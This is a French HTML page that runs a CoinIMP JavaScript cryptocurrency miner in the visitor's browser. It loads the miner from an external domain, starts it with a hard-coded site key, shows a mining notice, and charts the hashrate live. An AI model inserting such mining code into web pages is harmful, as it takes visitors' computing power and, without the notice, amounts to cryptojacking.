<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>CoinIMP Miner</title>
  <style>
    body {
      background:#0d0d0d;
      color:#eee;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 30px;
    }
    canvas {
      margin-top: 20px;
      background: #1a1a1a;
      border: 1px solid #333;
      border-radius: 10px;
    }
    #currentHps, #totalHashes {
      font-size: 24px;
      margin-top: 20px;
      color: #4caf50;
    }
  </style>
</head>
<body>
  <h1>ðŸ’» CoinIMP JavaScript Miner</h1>

  <h2>ðŸ“Š Hashrate en temps rÃ©el</h2>
  <div id="currentHps">0.00 H/s</div>
  <div id="totalHashes">Total hashes: 0</div>
  <canvas id="hashrateChart" width="600" height="300"></canvas>

  <!-- Script Chart.js -->
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>

  <!-- Script CoinIMP -->
  <script src="https://www.hostingcloud.racing/WPmG.js"></script>
  <script>
    // DÃ©marrage du mineur
    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
      throttle: 0.1, 
      c: 'w'
    });
    _client.start();
    _client.addMiningNotification(
      "Bottom", 
      "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", 
      "#cccccc", 20, "#3d3d3d"
    );

    // =========================
    //  GRAPHE H/s EN TEMPS REEL
    // =========================
    const ctx = document.getElementById('hashrateChart').getContext('2d');
    const hashrateChart = new Chart(ctx, {
      type: 'line',
      data: {
        labels: [],
        datasets: [{
          label: 'Hashes/s',
          data: [],
          borderColor: '#4caf50',
          backgroundColor: 'rgba(76, 175, 80, 0.2)',
          fill: true,
          tension: 0.3
        }]
      },
      options: {
        responsive: false,
        animation: false,
        scales: {
          x: {
            title: { display: true, text: 'Temps (s)' },
            ticks: { color: '#aaa' }
          },
          y: {
            beginAtZero: true,
            title: { display: true, text: 'H/s' },
            ticks: { color: '#aaa' }
          }
        },
        plugins: {
          legend: { labels: { color: '#eee' } }
        }
      }
    });

    // Compteurs H/s et total hashes
    const currentHpsDisplay = document.getElementById("currentHps");
    const totalHashesDisplay = document.getElementById("totalHashes");
    let time = 0;

    setInterval(() => {
      if (_client.isRunning()) {
        const hps = _client.getHashesPerSecond();
        const total = _client.getTotalHashes();

        // Mettre Ã  jour les compteurs
        currentHpsDisplay.textContent = hps.toFixed(2) + " H/s";
        totalHashesDisplay.textContent = "Total hashes: " + total;

        // Ajouter au graphe
        hashrateChart.data.labels.push(time + "s");
        hashrateChart.data.datasets[0].data.push(hps);

        // Garde seulement les 20 derniers points
        if (hashrateChart.data.labels.length > 20) {
          hashrateChart.data.labels.shift();
          hashrateChart.data.datasets[0].data.shift();
        }

        hashrateChart.update();
        time++;
      }
    }, 1000); // mise Ã  jour chaque seconde
  </script>
</body>
</html>
